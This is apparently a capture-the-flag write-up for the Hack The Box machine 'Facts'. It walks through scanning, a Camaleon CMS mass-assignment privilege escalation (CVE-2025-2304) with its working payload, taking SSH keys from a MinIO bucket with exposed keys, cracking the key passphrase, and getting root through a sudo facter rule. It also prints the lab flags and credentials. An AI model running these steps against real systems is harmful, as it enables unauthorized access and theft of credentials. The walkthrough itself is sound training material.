# Flags
- User
	- 26cea0da2c3d6b66f8aef41fc9ac3f3d
- Root
	- ead755a9ccf9d47829e2723f90d86a87


# Notes
- First, let's start with a scan
```
rustscan --ulimit 5000 --addresses "10.129.7.136" --top -- -sC -sV
```
- From the results, we can see that we have 3 TCP ports open
```
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)                                                                                                                                            
| ssh-hostkey:                                                                                                                                                                                                                                 
|   256 4dd7b28cd4df579ca42fdfc6e3012989 (ECDSA)                                                                                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNYjzL0v+zbXt5Zvuhd63ZMVGK/8TRBsYpIitcmtFPexgvOxbFiv6VCm9ZzRBGKf0uoNaj69WYzveCNEWxdQUww=                                                                             
|   256 a3ad6b2f4abf6f48ac81b9453fdefb87 (ED25519)                                                                                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPCNb2NXAGnDBofpLTCGLMyF/N6Xe5LIri/onyTBifIK                                                                                                                                                             
80/tcp    open  http    syn-ack ttl 63 nginx 1.26.3 (Ubuntu)                                                                                                                                                                                   
| http-methods:                                                                                                                                                                                                                                
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                                   
|_http-title: Did not follow redirect to http://facts.htb/                                                                                                                                                                                     
|_http-server-header: nginx/1.26.3 (Ubuntu)                                                                                                                                                                                                    
54321/tcp open  unknown syn-ack ttl 62                                                                                                                                                                                                         
| fingerprint-strings:                                                                                                                                                                                                                         
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:                                                                                                                                             
|     HTTP/1.1 400 Bad Request                                                                                                                                                                                                                 
|     Content-Type: text/plain; charset=utf-8                                                                                                                                                                                                  
|     Connection: close                                                                                                                                                                                                                        
|     Request                                                                                                                                                                                                                                  
|   GetRequest:                                                                                                                                                                                                                                
|     HTTP/1.0 400 Bad Request                                                                                                                                                                                                                 
|     Accept-Ranges: bytes                                                                                                                                                                                                                     
|     Content-Length: 276                                                                                                                                                                                                                      
|     Content-Type: application/xml                                                                                                                                                                                                            
|     Server: MinIO                                                                                                                                                                                                                            
|     Strict-Transport-Security: max-age=31536000; includeSubDomains                                                                                                                                                                           
|     Vary: Origin                                                                                                                                                                                                                             
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8                                                                                                                                                             
|     X-Amz-Request-Id: 188FEF5976FA9E23  
|     X-Content-Type-Options: nosniff  
|     X-Xss-Protection: 1; mode=block  
|     Date: Sat, 31 Jan 2026 21:52:26 GMT  
|     <?xml version="1.0" encoding="UTF-8"?>  
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>188FEF5976FA9E23</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId><  
/Error>  
|   HTTPOptions:    
|     HTTP/1.0 200 OK  
|     Vary: Origin  
|     Date: Sat, 31 Jan 2026 21:52:26 GMT  
|_    Content-Length: 0
```
- We have a SSH server, a web server, and an unknown service running as well
- Attempting to visit the website, we learn that the IP is binded to a domain
![[Screenshot_20260131_135830.png]]
- We can add that into the /etc/hosts
```
10.129.7.136    facts.htb
```
- We can now visit the site freely
![[Screenshot_20260131_135935.png]]
- I will go ahead and also run gobuster to find anything
```
gobuster dir -w `fzf-wordlists` -u http://facts.htb
```
- Got some interesting results
```
[Jan 31, 2026 - 13:58:01 (PST)] exegol-htb-season /workspace # gobuster dir -w `fzf-wordlists` -u http://facts.htb                           
===============================================================  
Gobuster v3.8  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://facts.htb  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /opt/lists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.8  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/index                (Status: 200) [Size: 11113]  
/search               (Status: 200) [Size: 19187]  
/sitemap              (Status: 200) [Size: 3508]  
/rss                  (Status: 200) [Size: 183]  
/en                   (Status: 200) [Size: 11109]  
/page                 (Status: 200) [Size: 19593]  
/welcome              (Status: 200) [Size: 11966]  
/admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]  
/post                 (Status: 200) [Size: 11308]  
/ajax                 (Status: 200) [Size: 0]  
/Index                (Status: 200) [Size: 11113]  
/up                   (Status: 200) [Size: 73]  
/-                    (Status: 200) [Size: 11098]  
/404                  (Status: 200) [Size: 4836]  
/robots               (Status: 200) [Size: 33]  
/EN                   (Status: 200) [Size: 11109]  
/400                  (Status: 200) [Size: 6685]  
/error                (Status: 500) [Size: 7918]  
/500                  (Status: 200) [Size: 7918]  
/422                  (Status: 200) [Size: 8380]  
/captcha              (Status: 200) [Size: 5454]  
/INDEX                (Status: 200) [Size: 11113]
```
- We have access to an admin page, that does use the classic html forms
-  I went ahead and tried sqlmap against it, but was not able to find anything
- One part of this is that this site is using an authenticity_token along with cooklies
- However, sqlmap has functions to get around this, so I went ahead and put something together after some more internet research and talking it with ChatGPT
- Nothing happening there, I was able to create a test user and get the information that this service is running Camaleon CMS 2.9.0
- Going to the user edit function, I noticed that we are assigned an ID
![[Screenshot_20260131_150659.png]]
- Looking in to the source code, sure enough, the ID is being referenced from an AJAX endpoint
- We can still use Burp Suite to send stuff to this AJAX endpoint
- I was able to do more research and found a PoC for the vulnerability I was talking about earlier:
	- https://github.com/d3vn0mi/cve-2025-2304-poc
- I was able to find something:
```
[Jan 31, 2026 - 15:37:33 (PST)] exegol-htb-season cve-2025-2304-poc # python3 cve-2025-2304.py http://facts.htb -u user -p password  
  
============================================================  
  CVE-2025-2304 - Camaleon CMS Privilege Escalation PoC  
  Pre-Registered User Version  
============================================================  
      
[*] Target: http://facts.htb  
[*] Username: user  
[*] Password: ********  
  
[*] Logging in as user...  
[+] Successfully logged in  
  
[*] Checking CMS version...  
[*] Detected version: 2.9.0  
[+] Version is VULNERABLE (< 2.9.1)  
  
============================================================  
[*] Testing CVE-2025-2304 Mass Assignment Vulnerability  
============================================================  
  
[*] Target User: user (ID: 6)  
[*] Current Role: Client (client)  
[*] Password will remain unchanged  
  
[1/7] Testing: AJAX endpoint - user[role]  
   ✗ Failed  
[2/7] Testing: AJAX endpoint - password[role]  
  
============================================================  
[+] EXPLOITATION SUCCESSFUL!  
============================================================  
[+] Privilege Escalation: Client → Administrator  
[+] Vulnerable Endpoint: /admin/users/6/updated_ajax  
[+] Working Payload: {'password[role]': 'admin'}  
[+] Password Unchanged: User can still login normally  
[+] CVE-2025-2304 CONFIRMED!  
  
[✓] CVE-2025-2304 VULNERABILITY CONFIRMED
```
- I now have more features opened up to me
![[Screenshot_20260131_154010.png]]
- I also see I am able to upload images, in which my mind went to reverse shells
![[Screenshot_20260131_154346.png]]
- Looking at the port 54321 again, it looks like MinIO is being ran
- However, in all of my wisdom, I totally missed this in the settings tab
![[Screenshot_20260131_210520.png]]
- There were MinIO credentials... THE WHOLE FUCKING TIME
- Anyways, I have the access and secret keys that I can use now
- Now, I need to use the minio mc tool, which I can download a copy and install onto my exegol instance
	- https://github.com/minio/mc
- With that downloaded, I am able to establish a connection to the bucket
```
[Jan 31, 2026 - 21:16:48 (PST)] exegol-htb-season /workspace # ./mc alias set myminio http://facts.htb:54321 AKIAF87454E254C1E078 FBuQH887fyD6aNJSq/rtRO7UkpV+MmItucKxcWrO  
Added `myminio` successfully.  
[Jan 31, 2026 - 21:19:01 (PST)] exegol-htb-season /workspace # mc ls myminio  
zsh: command not found: mc  
[Jan 31, 2026 - 21:19:07 (PST)] exegol-htb-season /workspace # ./mc ls myminio                                                                                               
[2025-09-11 05:06:52 PDT]     0B internal/
```
- This worked. Wow..... I could have figured this out much earlier on
- Looking into the internals, we have some interesting results
```
[Jan 31, 2026 - 21:26:51 (PST)] exegol-htb-season /workspace # ./mc ls myminio                     
[2025-09-11 05:06:52 PDT]     0B internal/  
[2025-09-11 05:06:52 PDT]     0B randomfacts/  
[Jan 31, 2026 - 21:27:40 (PST)] exegol-htb-season /workspace # ./mc ls myminio/internal            
[2026-01-08 10:45:13 PST]   220B STANDARD .bash_logout  
[2026-01-08 10:45:13 PST] 3.8KiB STANDARD .bashrc  
[2026-01-08 10:47:17 PST]    20B STANDARD .lesshst  
[2026-01-08 10:47:17 PST]   807B STANDARD .profile  
[2026-01-31 21:27:43 PST]     0B .bundle/  
[2026-01-31 21:27:43 PST]     0B .cache/  
[2026-01-31 21:27:43 PST]     0B .ssh/
```
- We are then able to find some SSH keys. I went ahead and downloaded those
```
[Jan 31, 2026 - 21:34:04 (PST)] exegol-htb-season /workspace # ./mc cp myminio/internal/.ssh/authorized_keys .  
...tb:54321/internal/.ssh/authorized_keys: 82 B / 82 B ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 117 B/s 0s  
[Jan 31, 2026 - 21:36:01 (PST)] exegol-htb-season /workspace # ./mc cp myminio/internal/.ssh/id_ed25519 .        
...cts.htb:54321/internal/.ssh/id_ed25519: 464 B / 464 B ┃▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓┃ 1.27 KiB/s 0s  
[Jan 31, 2026 - 21:36:11 (PST)] exegol-htb-season /workspace # ls  
authorized_keys  cve-2025-2304-poc  id_ed25519  mc
```
- Not sure where to go from here since I don't have a SSH username. I tried internal, but that didn't seem to work, so I'm going to use Metasploit's SSH enumeration first to see what's up
- We are given a private SSH key that is in encrypted
```
-----BEGIN OPENSSH PRIVATE KEY-----  
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCd+7Oeqa  
peNYDfJ+JuELQqAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIPia4S8u1j7Pv7lL  
Npvchz7LNtqVyToE9muqrEb+fnQaAAAAoI2OOmnnbWYhaAzfqiI0mhlnWOJqtmuSA4FxxK  
XGheTBErIeeZMh88QfekgBX2lqd9Uss2WKaDe7GsOLipTdUBw5jGwJZTujqO3C9j6C9BBj  
11aG79x5Kr9O0lPT8vZ8tAvpcEjfPMDTEvk2LjcC48w97bUmTtGwV/sVEPHpT4x1epczlL  
rOPp4Sa+J9/9t7fQfsnuyuN12LV7u1ksR3ESo=  
-----END OPENSSH PRIVATE KEY-----
```
- So, I will use ssh2john to get the hash so that we can crack it
```
[Feb 02, 2026 - 14:47:30 (PST)] exegol-htb-season /workspace # ssh2john.py id_ed25519 > ssh_hash.txt                                
[Feb 02, 2026 - 15:05:24 (PST)] exegol-htb-season /workspace # ls  
authorized_keys  cve-2025-2304-poc  id_ed25519  mc  ssh_hash.txt  
[Feb 02, 2026 - 15:05:25 (PST)] exegol-htb-season /workspace # cat ssh_hash.txt    
id_ed25519:$sshng$6$16$9dfbb39ea9aa5e3580df27e26e10b42a$290$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000109dfbb39ea9aa5e3580df27e26e10b42a0000001800000001000000330000000b7373682d6564323535  
313900000020f89ae12f2ed63ecfbfb94b369bdc873ecb36da95c93a04f66baaac46fe7e741a000000a08d8e3a69e76d6621680cdfaa22349a196758e26ab66b92038171c4a5c685e4c112b21e799321f3c41f7a48015f696a77d52cb3658a6837bb1ac38b8a94dd501c398c6c09653ba3a8edc2f63e  
82f41063d75686efdc792abf4ed253d3f2f67cb40be97048df3cc0d312f9362e3702e3cc3dedb5264ed1b057fb1510f1e94f8c757a973394bace3e9e126be27dffdb7b7d07ec9eecae375d8b57bbb592c477112a$24$130
```
- Now that we have the hash, let's attempt to crack it
```
[Feb 02, 2026 - 15:05:27 (PST)] exegol-htb-season /workspace # john --wordlist=`fzf-wordlists` ssh_hash.txt          
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])  
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 24 for all loaded hashes  
Will run 32 OpenMP threads  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
dragonballz      (id_ed25519)        
1g 0:00:00:14 DONE (2026-02-02 15:06) 0.06882g/s 229.0p/s 229.0c/s 229.0C/s adriano..cartman  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.
```
- We were able to get the password! We now have a password... to a user
	- dragonballz
- However, I was able to find this additional vulnerability for the CMS:
	- https://github.com/advisories/GHSA-cp65-5m9r-vc2c
- So, we can use this to get more information from the system
- We can do this by replicating this by using Burp Suite
- Sure enough, we were able to get something:
![[Screenshot_20260202_163236.png]]
- So, we now have two possible users: william and trivia
- I was actually able to use this exploit to find trivia's private SSH key as well, so I'll use that
- The container one maybe for later (?)
- Sure enough, that worked
```
[Feb 02, 2026 - 16:37:38 (PST)] exegol-htb-season /workspace # cat authorized_keys    
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPia4S8u1j7Pv7lLNpvchz7LNtqVyToE9muqrEb+fnQa    
[Feb 02, 2026 - 16:37:39 (PST)] exegol-htb-season /workspace # ls  
authorized_keys  cve-2025-2304-poc  id_ed25519  mc  
[Feb 02, 2026 - 16:38:26 (PST)] exegol-htb-season /workspace # cat id_ed25519        
-----BEGIN OPENSSH PRIVATE KEY-----  
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABCd+7Oeqa  
peNYDfJ+JuELQqAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIPia4S8u1j7Pv7lL  
Npvchz7LNtqVyToE9muqrEb+fnQaAAAAoI2OOmnnbWYhaAzfqiI0mhlnWOJqtmuSA4FxxK  
XGheTBErIeeZMh88QfekgBX2lqd9Uss2WKaDe7GsOLipTdUBw5jGwJZTujqO3C9j6C9BBj  
11aG79x5Kr9O0lPT8vZ8tAvpcEjfPMDTEvk2LjcC48w97bUmTtGwV/sVEPHpT4x1epczlL  
rOPp4Sa+J9/9t7fQfsnuyuN12LV7u1ksR3ESo=  
-----END OPENSSH PRIVATE KEY-----  
[Feb 02, 2026 - 16:39:31 (PST)] exegol-htb-season /workspace # ls  
authorized_keys  cve-2025-2304-poc  id_ed25519  mc  
[Feb 02, 2026 - 16:41:11 (PST)] exegol-htb-season /workspace # rm -rf authorized_keys id_ed25519                                    
[Feb 02, 2026 - 16:41:14 (PST)] exegol-htb-season /workspace # ls  
cve-2025-2304-poc  mc  
[Feb 02, 2026 - 16:41:14 (PST)] exegol-htb-season /workspace # nano key           
[Feb 02, 2026 - 16:41:18 (PST)] exegol-htb-season /workspace # ssh2john.py key > ssh_hash.txt          
[Feb 02, 2026 - 16:41:26 (PST)] exegol-htb-season /workspace # ls  
cve-2025-2304-poc  key  mc  ssh_hash.txt  
[Feb 02, 2026 - 16:41:26 (PST)] exegol-htb-season /workspace # john --wordlist=`fzf-wordlists` ssh_hash.txt  
Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [MD5/bcrypt-pbkdf/[3]DES/AES 32/64])  
Cost 1 (KDF/cipher [0:MD5/AES 1:MD5/[3]DES 2:bcrypt-pbkdf/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 24 for all loaded hashes  
Will run 32 OpenMP threads  
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status  
dragonballz      (key)        
1g 0:00:00:14 DONE (2026-02-02 16:41) 0.06882g/s 229.0p/s 229.0c/s 229.0C/s adriano..cartman  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.    
[Feb 02, 2026 - 16:41:54 (PST)] exegol-htb-season /workspace # ls  
cve-2025-2304-poc  key  mc  ssh_hash.txt  
[Feb 02, 2026 - 16:42:15 (PST)] exegol-htb-season /workspace # chmod 600 key               
[Feb 02, 2026 - 16:42:18 (PST)] exegol-htb-season /workspace # ssh -i key trivia@10.129.10.77       
Enter passphrase for key 'key':    
Last login: Wed Jan 28 16:17:19 UTC 2026 from 10.10.14.4 on ssh  
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
System information as of Tue Feb  3 12:42:33 AM UTC 2026  
  
 System load:           0.0  
 Usage of /:            71.8% of 7.28GB  
 Memory usage:          17%  
 Swap usage:            0%  
 Processes:             222  
 Users logged in:       1  
 IPv4 address for eth0: 10.129.10.77  
 IPv6 address for eth0: dead:beef::250:56ff:feb0:a7ce  
  
  
0 updates can be applied immediately.  
  
  
The list of available updates is more than a week old.  
To check for new updates run: su
```
- I was able to find the user.txt, which was in william's folder
```
trivia@facts:/home/william$ cat user.txt    
26cea0da2c3d6b66f8aef41fc9ac3f3d
```
- Alright, now time to priv-esc
- Running sudo -l, we do have something we can use
```
trivia@facts:/home/william$ sudo -l  
Matching Defaults entries for trivia on facts:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User trivia may run the following commands on facts:  
   (ALL) NOPASSWD: /usr/bin/facter
```
- We can use a /usr/bin/facter binary. I will now go ahead and research
- Sure enough, GTFOBins has an entry on this binary:
	- https://gtfobins.org/gtfobins/facter/
- So, with that, I go ahead and create a ruby file that will get us a bash instance
```
trivia@facts:/tmp$ cat > fun.rb << 'EOF'  
> exec '/bin/bash'  
> EOF  
trivia@facts:/tmp$ cat fun.rb `  
>    
> '  
> `  
-bash: command substitution: line 3: unexpected EOF while looking for matching `''  
exec '/bin/bash'  
trivia@facts:/tmp$ cat fun.rb    
exec '/bin/bash'
```
- I was able to get root!
- I had to use the --custom-dir since environment variables were not allowed
```
trivia@facts:~$ sudo facter --custom-dir=/tmp/facts x  
root@facts:/home/trivia# whoami  
root
```
- So, we can read out the root flag
```
root@facts:/home/trivia# cd /root  
root@facts:~# ls  
minio-binaries  ministack  root.txt  snap  
root@facts:~# cat root.txt    
ead755a9ccf9d47829e2723f90d86a87  
root@facts:~#
```
